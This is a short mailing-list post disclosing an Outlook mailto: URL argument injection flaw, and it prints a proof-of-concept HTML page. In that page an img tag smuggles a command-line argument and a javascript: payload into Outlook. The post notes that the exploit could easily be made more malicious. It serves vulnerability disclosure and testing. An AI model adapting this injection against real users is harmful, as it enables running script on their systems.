Subject: RE: Outlook mailto: URL argument injection vulnerability


Hello Bugtraq,

For those interested in testing the impact of this 
vulnerability, I have written a simple, non-malicious
PoC for this issue:

http://www.nettwerked.co.uk/code/outlooksploit.html


If you'd rather not visit an unverified link, here's
the code:


###outlooksploit.html
<!-- Outlook mailto: URL argument injection
proof-of-concept exploit,
     by shaun2k2.  The exploit can be easily modified
to execute more
     malicious things.
-->

<html>
<body>
<!-- This is the exploit string. -->
<img src="mailto:aa&quot; /select
javascript:alert('vulnerable')">
</body>
</html>
###EOF

If you're vulnerable, Outlook will launch and you will
see an alert box saying "vulnerable".  Also, depending
on what version you are using, you might get an error
box saying outlook cannot load and that the command
line argument was not valid.  Either way, you are
still vulnerable, I believe.  I recommend you upgrade
:).

Obviously, the exploit could be easily modified to do
more malicious things, but this at least demonstrates
the issue.



Thank you for your time.
Shaun.
